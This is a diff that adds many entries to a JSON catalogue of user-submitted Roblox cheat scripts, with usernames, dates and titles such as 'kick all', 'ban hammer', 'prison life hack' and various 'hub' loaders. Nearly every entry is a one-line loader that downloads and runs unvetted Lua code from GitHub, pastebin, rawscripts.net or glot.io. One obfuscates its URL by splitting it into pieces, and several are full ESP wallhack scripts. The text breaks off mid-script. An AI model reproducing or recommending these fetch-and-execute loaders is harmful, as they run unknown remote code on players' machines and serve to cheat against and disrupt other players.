@@ -7047,6 +7047,750 @@
       "Script_Title": "s",
       "User_ID": 4448634577,
       "Username": "paAmfong"
+    },
+    "Script1149": {
+      "Date": "November 09 2024",
+      "Description": "dropkick?",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/McMusty/McMusty/refs/heads/main/EssenceOfDropkicking\"))();",
+      "Script_Title": "right 2 fight",
+      "User_ID": 5226088362,
+      "Username": "suiiixr60"
+    },
+    "Script1150": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-R6-Animations-Menu-By-Me-19427\"))()",
+      "Script_Title": "200 animation",
+      "User_ID": 4199826251,
+      "Username": "CMETANKA199373"
+    },
+    "Script1151": {
+      "Date": "November 09 2024",
+      "Description": "PLS FOLLOW ME ",
+      "Script": "_G.Mode = \"Eng\"\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/AAwful/VectorHub/main/Loader.lua\"))()",
+      "Script_Title": "BLOX FRUIT SCRIPT ",
+      "User_ID": 5291790212,
+      "Username": "700bloxft"
+    },
+    "Script1152": {
+      "Date": "November 09 2024",
+      "Description": "Fake macro da hood",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Da-Hood-Fake-Macro-5784\"))()",
+      "Script_Title": "Fake macro",
+      "User_ID": 7360122513,
+      "Username": "pedroplays670exe"
+    },
+    "Script1153": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Evade'))()",
+      "Script_Title": "evade",
+      "User_ID": 4520217490,
+      "Username": "astt_gsh"
+    },
+    "Script1154": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-FE-server-finder-ui-8992\"))()",
+      "Script_Title": "server finder",
+      "User_ID": 4726109804,
+      "Username": "whoiscom12341"
+    },
+    "Script1155": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Mahitotsbupdate'))()",
+      "Script_Title": "Script Mahito",
+      "User_ID": 7557114870,
+      "Username": "bob1000376"
+    },
+    "Script1156": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-Tsb-toji-script-19917\"))()loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-Tsb-toji-script-19917\"))()",
+      "Script_Title": "the strongest battle",
+      "User_ID": 7557114870,
+      "Username": "bob1000376"
+    },
+    "Script1157": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999\"))()",
+      "Script_Title": "REDZ blox fruit",
+      "User_ID": 7557114870,
+      "Username": "bob1000376"
+    },
+    "Script1158": {
+      "Date": "November 09 2024",
+      "Description": "hoho hub for blox fruits",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()",
+      "Script_Title": "hoho hub (key)",
+      "User_ID": 5717888103,
+      "Username": "werdx33xxxr5"
+    },
+    "Script1159": {
+      "Date": "November 09 2024",
+      "Description": "Script good",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/sXPiterXs1111/SanderXV2.9/main/Brookhaven.lua'))()",
+      "Script_Title": "brookhaven script",
+      "User_ID": 7557114870,
+      "Username": "bob1000376"
+    },
+    "Script1160": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "nothing",
+      "User_ID": 5596778686,
+      "Username": "kiwih69"
+    },
+    "Script1161": {
+      "Date": "November 09 2024",
+      "Description": "prizzLife",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "prison life hack",
+      "User_ID": 7553279081,
+      "Username": "whysosearus_1222"
+    },
+    "Script1162": {
+      "Date": "November 09 2024",
+      "Description": "Best Script Hub OP",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/ndeVSVbv\"))()",
+      "Script_Title": "Croissant Hub ",
+      "User_ID": 4393082564,
+      "Username": "emilcarevskiy96"
+    },
+    "Script1163": {
+      "Date": "November 09 2024",
+      "Description": "Anthaxx",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Ant-Life-BROODMOTHER-Haxx-V6-test-12224\"))()",
+      "Script_Title": "Anthaxx pc",
+      "User_ID": 7360122513,
+      "Username": "pedroplays670exe"
+    },
+    "Script1164": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Guerra-de-Torres-Teleportation-to-the-Towers-21762\"))()",
+      "Script_Title": "Torres Tower",
+      "User_ID": 6046226913,
+      "Username": "Rfaa_tauhid"
+    },
+    "Script1165": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SAZXHUB/SUPER_RING_V2_BY_CAT_DEV/refs/heads/main/README.md\"))()",
+      "Script_Title": "Super bring part",
+      "User_ID": 7036763866,
+      "Username": "Johndys2005"
+    },
+    "Script1166": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet((\"https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua\"),true))()",
+      "Script_Title": "Imperial hub",
+      "User_ID": 4940182271,
+      "Username": "fcygrgtggglon"
+    },
+    "Script1167": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Hug-Gui-R6-17818\"))()",
+      "Script_Title": "hug fr",
+      "User_ID": 7560517544,
+      "Username": "ndhdbdbdbdbehhd"
+    },
+    "Script1168": {
+      "Date": "November 09 2024",
+      "Description": "esp all name all Text Br 🇧🇷",
+      "Script": "local espEnabled = false  -- Estado inicial do ESP (desativado)\nlocal nameTagEnabled = false  -- Estado inicial do NameTag (desativado)\nlocal updateInterval = 3 -- Tempo em segundos para atualização regular\n\n-- Função para criar a ESP\nlocal function createESP(player)\n    if player == game.Players.LocalPlayer then return end\n\n    if espEnabled and player.Character and player.Character:FindFirstChild(\"Head\") and not player.Character.Head:FindFirstChild(\"ESPBox\") then\n        local billboard = Instance.new(\"BillboardGui\", player.Character.Head)\n        billboard.Name = \"ESPBox\"\n        billboard.Size = UDim2.new(2, 0, 2, 0)\n        billboard.AlwaysOnTop = true\n        \n        local frame = Instance.new(\"Frame\", billboard)\n        frame.Size = UDim2.new(1, 0, 1, 0)\n        frame.BackgroundTransparency = 0.5\n        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n    end\nend\n\n-- Função para criar o NameTag\nlocal function createNameTag(player)\n    if player == game.Players.LocalPlayer then return end\n\n    if nameTagEnabled and player.Character and player.Character:FindFirstChild(\"Head\") and not player.Character.Head:FindFirstChild(\"NameTag\") then\n        local nameTag = Instance.new(\"BillboardGui\", player.Character.Head)\n        nameTag.Name = \"NameTag\"\n        nameTag.Size = UDim2.new(2, 0, 0.5, 0)\n        nameTag.AlwaysOnTop = true\n        local nameLabel = Instance.new(\"TextLabel\", nameTag)\n        nameLabel.Size = UDim2.new(1, 0, 1, 0)\n        nameLabel.BackgroundTransparency = 1\n        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\n        nameLabel.Text = player.Name\n        nameLabel.Font = Enum.Font.SourceSansBold\n        nameLabel.TextSize = 14\n    end\nend\n\n-- Função para atualizar o ESP e o NameTag\nlocal function updateVisuals()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        if espEnabled then\n            createESP(player)\n        end\n        if nameTagEnabled then\n            createNameTag(player)\n        end\n    end\nend\n\n-- Função para limpar o ESP e o NameTag quando desativados\nlocal function clearVisuals()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        if player.Character and player.Character:FindFirstChild(\"Head\") then\n            local espBox = player.Character.Head:FindFirstChild(\"ESPBox\")\n            if espBox then\n                espBox:Destroy()\n            end\n            local nameTag = player.Character.Head:FindFirstChild(\"NameTag\")\n            if nameTag then\n                nameTag:Destroy()\n            end\n        end\n    end\nend\n\n-- Criar o botão de ESP na tela\nlocal screenGui = Instance.new(\"ScreenGui\", game.CoreGui)\nlocal espButton = Instance.new(\"TextButton\", screenGui)\nespButton.Size = UDim2.new(0, 100, 0, 50)\nespButton.Position = UDim2.new(0, 10, 0, 10)\nespButton.Text = \"Ativar ESP\"\nespButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\nespButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nespButton.Font = Enum.Font.SourceSans\nespButton.TextSize = 18\nespButton.Draggable = true\n\n-- Função para alternar o estado do ESP\nlocal function toggleESP()\n    espEnabled = not espEnabled\n    if espEnabled then\n        espButton.Text = \"Desativar ESP\"\n        espButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\n        updateVisuals()\n    else\n        espButton.Text = \"Ativar ESP\"\n        espButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n        clearVisuals()\n        if nameTagEnabled then updateVisuals() end\n    end\nend\n\nespButton.MouseButton1Click:Connect(toggleESP)\n\n-- Criar o botão de NameTag\nlocal nameTagButton = Instance.new(\"TextButton\", screenGui)\nnameTagButton.Size = UDim2.new(0, 100, 0, 50)\nnameTagButton.Position = UDim2.new(0, 120, 0, 10)\nnameTagButton.Text = \"Mostrar Nomes\"\nnameTagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\nnameTagButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nnameTagButton.Font = Enum.Font.SourceSans\nnameTagButton.TextSize = 18\nnameTagButton.Draggable = true\n\n-- Função para alternar o estado do NameTag\nlocal function toggleNameTag()\n    nameTagEnabled = not nameTagEnabled\n    if nameTagEnabled then\n        nameTagButton.Text = \"Esconder Nomes\"\n        nameTagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\n        updateVisuals()\n    else\n        nameTagButton.Text = \"Mostrar Nomes\"\n        nameTagButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n        clearVisuals()\n        if espEnabled then updateVisuals() end\n    end\nend\n\nnameTagButton.MouseButton1Click:Connect(toggleNameTag)\n\n-- Botão para esconder/mostrar todos os botões\nlocal toggleButton = Instance.new(\"TextButton\", screenGui)\ntoggleButton.Size = UDim2.new(0, 50, 0, 50)\ntoggleButton.Position = UDim2.new(0, 230, 0, 10)\ntoggleButton.Text = \"X\"\ntoggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\ntoggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)\ntoggleButton.Font = Enum.Font.SourceSansBold\ntoggleButton.TextSize = 18\ntoggleButton.Draggable = true\n\n-- Função para ocultar/exibir os botões de ESP e NameTag\nlocal buttonsVisible = true\nlocal function toggleButtonsVisibility()\n    buttonsVisible = not buttonsVisible\n    espButton.Visible = buttonsVisible\n    nameTagButton.Visible = buttonsVisible\nend\n\ntoggleButton.MouseButton1Click:Connect(toggleButtonsVisibility)\n\n-- Atualização do ESP e NameTag a cada intervalo\nspawn(function()\n    while true do\n        if espEnabled or nameTagEnabled then\n            updateVisuals()\n        end\n        wait(updateInterval)\n    end\nend)\n\n-- Atualiza ao jogador entrar ou morrer\ngame.Players.PlayerAdded:Connect(updateVisuals)\ngame.Players.PlayerRemoving:Connect(updateVisuals)\ngame.Players.PlayerAdded:Connect(function(player)\n    player.CharacterAdded:Connect(function()\n        wait(1)\n        updateVisuals()\n    end)\nend)",
+      "Script_Title": "esp name pt+br)tx",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1169": {
+      "Date": "November 09 2024",
+      "Description": "the strongest battlegrounds script Sonic",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Aosknfndnosor/Osufbwbs/refs/heads/main/Sonic%20Script\", true))()",
+      "Script_Title": "sonic the strongest",
+      "User_ID": 7557114870,
+      "Username": "bob1000376"
+    },
+    "Script1170": {
+      "Date": "November 09 2024",
+      "Description": "follow me",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Uhhh1230/Pop-It-Trading/main/E\"))()\n\n",
+      "Script_Title": "pop it trading😎",
+      "User_ID": 4269106874,
+      "Username": "MotolanuYT0"
+    },
+    "Script1171": {
+      "Date": "November 09 2024",
+      "Description": "script fisch new now! ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Loader.lua\"))()",
+      "Script_Title": "Fisch new",
+      "User_ID": 2311675723,
+      "Username": "Monta123k"
+    },
+    "Script1172": {
+      "Date": "November 09 2024",
+      "Description": "Script HD admin op Feito por 2areyoumentL110",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Spam-hd-admin-19746\"))()",
+      "Script_Title": "Hx HD ADMIN spam",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1173": {
+      "Date": "November 09 2024",
+      "Description": "script only works in car games",
+      "Script": "loadstring(game:HttpGet(\"https://gist.githubusercontent.com/dark-modz/5aed2fbe731daca594361da9a4944e70/raw/60b8bae3946abf15682c9e324d1fefb6a31cb81d/fix\",true))()",
+      "Script_Title": "HX CMD ADM games car",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1174": {
+      "Date": "November 09 2024",
+      "Description": "rochips universal rochips",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Rochips-Universal-21865\"))()\n",
+      "Script_Title": "rochips universal",
+      "User_ID": 5583019807,
+      "Username": "folksongnas_alt"
+    },
+    "Script1175": {
+      "Date": "November 09 2024",
+      "Description": "uh it isnt mine",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Yin-Hub-21835\"))()",
+      "Script_Title": "yin hub yessir",
+      "User_ID": 5583019807,
+      "Username": "folksongnas_alt"
+    },
+    "Script1176": {
+      "Date": "November 09 2024",
+      "Description": "blox fruits credits to: redz hub",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB\"))()",
+      "Script_Title": "blox fruit redz hub ",
+      "User_ID": 1246734209,
+      "Username": "aseryaser234"
+    },
+    "Script1177": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "GHOT HUB",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script1178": {
+      "Date": "November 09 2024",
+      "Description": "best",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/wC64LrAJ',true))()",
+      "Script_Title": "v6 script",
+      "User_ID": 7553279081,
+      "Username": "whysosearus_1222"
+    },
+    "Script1179": {
+      "Date": "November 09 2024",
+      "Description": "jf",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/wC64LrAJ',true))()",
+      "Script_Title": "r6",
+      "User_ID": 7553279081,
+      "Username": "whysosearus_1222"
+    },
+    "Script1180": {
+      "Date": "November 10 2024",
+      "Description": "op Autoplay script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Basically-FNF:-Remix-AutoPlayer-Lite-9989\"))()",
+      "Script_Title": "Basically FNF Remix",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script1181": {
+      "Date": "November 10 2024",
+      "Description": "ai chat",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Fun-AI-Chatbot-Smart-21041\"))()",
+      "Script_Title": "chatBot Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script1182": {
+      "Date": "November 09 2024",
+      "Description": "doors exploit",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/DOORS-MSHUB-12392\"))()",
+      "Script_Title": "msdoors",
+      "User_ID": 7517663474,
+      "Username": "slapha80"
+    },
+    "Script1183": {
+      "Date": "November 09 2024",
+      "Description": "kick all",
+      "Script": "require(7004742023).Kick(\"YourUserHere\")\n",
+      "Script_Title": "hehehehe",
+      "User_ID": 7076318713,
+      "Username": "Carlinhos12087"
+    },
+    "Script1184": {
+      "Date": "November 10 2024",
+      "Description": "universal",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-FE-Ban-Hammer-10852\"))()",
+      "Script_Title": "ban hammer",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script1185": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals\"))()",
+      "Script_Title": "Rivals script Op",
+      "User_ID": 7559722646,
+      "Username": "Jfijdbdidbf"
+    },
+    "Script1186": {
+      "Date": "November 09 2024",
+      "Description": "blox fruits",
+      "Script": "loadstring(game:HttpGet\"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua\")()",
+      "Script_Title": "MOON_HUB",
+      "User_ID": 4837644196,
+      "Username": "alilol615"
+    },
+    "Script1187": {
+      "Date": "November 09 2024",
+      "Description": "the best",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua\"))()",
+      "Script_Title": "neko working",
+      "User_ID": 7553279081,
+      "Username": "whysosearus_1222"
+    },
+    "Script1188": {
+      "Date": "November 10 2024",
+      "Description": "very very op",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub\"))()",
+      "Script_Title": "farm mm2 ",
+      "User_ID": 7454365189,
+      "Username": "SILLIK1337"
+    },
+    "Script1189": {
+      "Date": "November 09 2024",
+      "Description": "Sakenkok",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/nv8DRdFK\"))()",
+      "Script_Title": "ghost hub",
+      "User_ID": 5045761670,
+      "Username": "School_437"
+    },
+    "Script1190": {
+      "Date": "November 09 2024",
+      "Description": "Sakenkok",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/nv8DRdFK\"))()",
+      "Script_Title": "Morescript",
+      "User_ID": 5045761670,
+      "Username": "School_437"
+    },
+    "Script1191": {
+      "Date": "November 09 2024",
+      "Description": "Cool script",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/nv8DRdFK\"))()",
+      "Script_Title": "Sakenkok",
+      "User_ID": 5045761670,
+      "Username": "School_437"
+    },
+    "Script1192": {
+      "Date": "November 09 2024",
+      "Description": "mm2",
+      "Script": "loadstring(game:HttpGetAsync(\"https://raw.githubusercontent.com/bruvzz/oasishub/main/script\"))()",
+      "Script_Title": "mm2",
+      "User_ID": 4676509456,
+      "Username": "sad_kris5"
+    },
+    "Script1193": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Robloxblast/Super-Soccer-League/refs/heads/main/Super\"))()\n",
+      "Script_Title": "r",
+      "User_ID": 4322015735,
+      "Username": "stichgame82773"
+    },
+    "Script1194": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "if \"Rochips Loader\" then\n\tlocal Rochips_panel,v,u,i=loadstring,\"/snippets\",\"gwwv\",\"/raw/main.lua\" ;\n\tRochips_panel(game:HttpGet(\"https://glot.io\"..v..\"/\" ..u..\"877ga3\"..i))();\n\treturn \"it will load in around 3 - 131 seconds\"\nend",
+      "Script_Title": "RochipsHaven",
+      "User_ID": 1639161436,
+      "Username": "84JOKER48"
+    },
+    "Script1195": {
+      "Date": "November 09 2024",
+      "Description": "SCRIPT BY HX47 BR LISTA DE PLAYERS BR PT ",
+      "Script": "local playerListEnabled = false\n\n-- Criação da GUI principal\nlocal screenGui = Instance.new(\"ScreenGui\", game.CoreGui)\nlocal playerListGui = Instance.new(\"Frame\", screenGui)\nplayerListGui.Size = UDim2.new(0, 200, 0, 300)\nplayerListGui.Position = UDim2.new(0.5, -100, 0.5, -150)\nplayerListGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)\nplayerListGui.BackgroundTransparency = 0.5\nplayerListGui.Visible = false\nplayerListGui.Active = true\nplayerListGui.Draggable = true  -- Permite que a lista de jogadores seja movida\n\nlocal titleLabel = Instance.new(\"TextLabel\", playerListGui)\ntitleLabel.Size = UDim2.new(1, 0, 0, 30)\ntitleLabel.Position = UDim2.new(0, 0, 0, 0)\ntitleLabel.Text = \"Jogadores no Jogo\"\ntitleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\ntitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)\ntitleLabel.Font = Enum.Font.SourceSansBold\ntitleLabel.TextSize = 18\n\nlocal playerList = Instance.new(\"ScrollingFrame\", playerListGui)\nplayerList.Size = UDim2.new(1, 0, 1, -30)\nplayerList.Position = UDim2.new(0, 0, 0, 30)\nplayerList.CanvasSize = UDim2.new(0, 0, 1, 0)\nplayerList.ScrollBarThickness = 10\n\n-- GUI para mostrar informações do jogador selecionado\nlocal playerInfoGui = Instance.new(\"Frame\", screenGui)\nplayerInfoGui.Size = UDim2.new(0, 300, 0, 200)\nplayerInfoGui.Position = UDim2.new(0.5, -150, 0.5, 0)\nplayerInfoGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)\nplayerInfoGui.BackgroundTransparency = 0.5\nplayerInfoGui.Visible = false\nplayerInfoGui.Active = true\nplayerInfoGui.Draggable = true  -- Permite que a GUI de informações do jogador seja movida\n\n-- Título e botão de fechar na GUI de informações\nlocal playerInfoTitle = Instance.new(\"TextLabel\", playerInfoGui)\nplayerInfoTitle.Size = UDim2.new(1, -30, 0, 30)\nplayerInfoTitle.Position = UDim2.new(0, 0, 0, 0)\nplayerInfoTitle.Text = \"Informações do Jogador\"\nplayerInfoTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nplayerInfoTitle.TextColor3 = Color3.fromRGB(0, 0, 0)\nplayerInfoTitle.Font = Enum.Font.SourceSansBold\nplayerInfoTitle.TextSize = 18\n\nlocal closeButton = Instance.new(\"TextButton\", playerInfoGui)\ncloseButton.Size = UDim2.new(0, 30, 0, 30)\ncloseButton.Position = UDim2.new(1, -30, 0, 0)\ncloseButton.Text = \"X\"\ncloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\ncloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)\ncloseButton.Font = Enum.Font.SourceSansBold\ncloseButton.TextSize = 18\ncloseButton.Draggable = true  -- Permite que o botão de fechar seja movido\n\ncloseButton.MouseButton1Click:Connect(function()\n    playerInfoGui.Visible = false\nend)\n\n-- Informações do jogador\nlocal playerNameLabel = Instance.new(\"TextLabel\", playerInfoGui)\nplayerNameLabel.Size = UDim2.new(1, 0, 0, 30)\nplayerNameLabel.Position = UDim2.new(0, 0, 0, 40)\nplayerNameLabel.BackgroundTransparency = 1\nplayerNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nplayerNameLabel.Font = Enum.Font.SourceSans\nplayerNameLabel.TextSize = 18\n\nlocal playerIdLabel = Instance.new(\"TextLabel\", playerInfoGui)\nplayerIdLabel.Size = UDim2.new(1, 0, 0, 30)\nplayerIdLabel.Position = UDim2.new(0, 0, 0, 70)\nplayerIdLabel.BackgroundTransparency = 1\nplayerIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nplayerIdLabel.Font = Enum.Font.SourceSans\nplayerIdLabel.TextSize = 18\n\nlocal accountAgeLabel = Instance.new(\"TextLabel\", playerInfoGui)\naccountAgeLabel.Size = UDim2.new(1, 0, 0, 30)\naccountAgeLabel.Position = UDim2.new(0, 0, 0, 100)\naccountAgeLabel.BackgroundTransparency = 1\naccountAgeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\naccountAgeLabel.Font = Enum.Font.SourceSans\naccountAgeLabel.TextSize = 18\n\nlocal statusLabel = Instance.new(\"TextLabel\", playerInfoGui)\nstatusLabel.Size = UDim2.new(1, 0, 0, 30)\nstatusLabel.Position = UDim2.new(0, 0, 0, 130)\nstatusLabel.BackgroundTransparency = 1\nstatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nstatusLabel.Font = Enum.Font.SourceSans\nstatusLabel.TextSize = 18\n\n-- Função para atualizar a lista de jogadores\nlocal function updatePlayerList()\n    -- Limpa a lista anterior\n    for _, child in pairs(playerList:GetChildren()) do\n        if child:IsA(\"TextButton\") then\n            child:Destroy()\n        end\n    end\n    \n    -- Adiciona os nomes dos jogadores\n    for i, player in ipairs(game.Players:GetPlayers()) do\n        local playerNameButton = Instance.new(\"TextButton\", playerList)\n        playerNameButton.Size = UDim2.new(1, 0, 0, 25)\n        playerNameButton.Position = UDim2.new(0, 0, 0, (i - 1) * 25)\n        playerNameButton.Text = player.Name\n        playerNameButton.BackgroundTransparency = 1\n        playerNameButton.TextColor3 = Color3.fromRGB(255, 255, 255)\n        playerNameButton.Font = Enum.Font.SourceSans\n        playerNameButton.TextSize = 18\n        \n        -- Evento de clique para mostrar as informações do jogador selecionado\n        playerNameButton.MouseButton1Click:Connect(function()\n            playerInfoGui.Visible = true\n            playerNameLabel.Text = \"Nome: \" .. player.Name\n            playerIdLabel.Text = \"ID: \" .. player.UserId\n            accountAgeLabel.Text = \"Dias de Conta: \" .. player.AccountAge\n            statusLabel.Text = \"Status: \" .. (player:IsDescendantOf(game.Players) and \"Online\" or \"Offline\")\n        end)\n    end\n    \n    playerList.CanvasSize = UDim2.new(0, 0, 0, #game.Players:GetPlayers() * 25)\nend\n\n-- Atualiza a lista ao entrar ou sair um jogador\ngame.Players.PlayerAdded:Connect(updatePlayerList)\ngame.Players.PlayerRemoving:Connect(updatePlayerList)\n\n-- Botão para ativar/desativar a lista de jogadores\nlocal toggleButton = Instance.new(\"TextButton\", screenGui)\ntoggleButton.Size = UDim2.new(0, 150, 0, 50)\ntoggleButton.Position = UDim2.new(0, 10, 0, 10)\ntoggleButton.Text = \"Mostrar Lista de Jogadores\"\ntoggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\ntoggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)\ntoggleButton.Font = Enum.Font.SourceSans\ntoggleButton.TextSize = 18\ntoggleButton.Draggable = true  -- Permite que o botão de alternar a lista de jogadores seja movido\n\nlocal function togglePlayerList()\n    playerListEnabled = not playerListEnabled\n    playerListGui.Visible = playerListEnabled\n    toggleButton.Text = playerListEnabled and \"Ocultar Lista de Jogadores\" or \"Mostrar Lista de Jogadores\"\n    if playerListEnabled then\n        updatePlayerList()\n    end\nend\n\ntoggleButton.MouseButton1Click:Connect(togglePlayerList) ",
+      "Script_Title": "Hx nik Lista players",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1196": {
+      "Date": "November 09 2024",
+      "Description": "Script esp e nomes script feito por criador brasileiro esse e oficial",
+      "Script": "local espEnabled = false  -- Estado inicial do ESP (desativado)\nlocal nameTagEnabled = false  -- Estado inicial do NameTag (desativado)\nlocal updateInterval = 3 -- Tempo em segundos para atualização regular\n\n-- Função para criar a ESP\nlocal function createESP(player)\n    if player == game.Players.LocalPlayer then return end\n\n    if espEnabled and player.Character and player.Character:FindFirstChild(\"Head\") and not player.Character.Head:FindFirstChild(\"ESPBox\") then\n        local billboard = Instance.new(\"BillboardGui\", player.Character.Head)\n        billboard.Name = \"ESPBox\"\n        billboard.Size = UDim2.new(2, 0, 2, 0)\n        billboard.AlwaysOnTop = true\n        \n        local frame = Instance.new(\"Frame\", billboard)\n        frame.Size = UDim2.new(1, 0, 1, 0)\n        frame.BackgroundTransparency = 0.5\n        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n    end\nend\n\n-- Função para criar o NameTag\nlocal function createNameTag(player)\n    if player == game.Players.LocalPlayer then return end\n\n    if nameTagEnabled and player.Character and player.Character:FindFirstChild(\"Head\") and not player.Character.Head:FindFirstChild(\"NameTag\") then\n        local nameTag = Instance.new(\"BillboardGui\", player.Character.Head)\n        nameTag.Name = \"NameTag\"\n        nameTag.Size = UDim2.new(2, 0, 0.5, 0)\n        nameTag.AlwaysOnTop = true\n        local nameLabel = Instance.new(\"TextLabel\", nameTag)\n        nameLabel.Size = UDim2.new(1, 0, 1, 0)\n        nameLabel.BackgroundTransparency = 1\n        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\n        nameLabel.Text = player.Name\n        nameLabel.Font = Enum.Font.SourceSansBold\n        nameLabel.TextSize = 14\n    end\nend\n\n-- Função para atualizar o ESP e o NameTag\nlocal function updateVisuals()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        if espEnabled then\n            createESP(player)\n        end\n        if nameTagEnabled then\n            createNameTag(player)\n        end\n    end\nend\n\n-- Função para limpar o ESP e o NameTag quando desativados\nlocal function clearVisuals()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        if player.Character and player.Character:FindFirstChild(\"Head\") then\n            local espBox = player.Character.Head:FindFirstChild(\"ESPBox\")\n            if espBox then\n                espBox:Destroy()\n            end\n            local nameTag = player.Character.Head:FindFirstChild(\"NameTag\")\n            if nameTag then\n                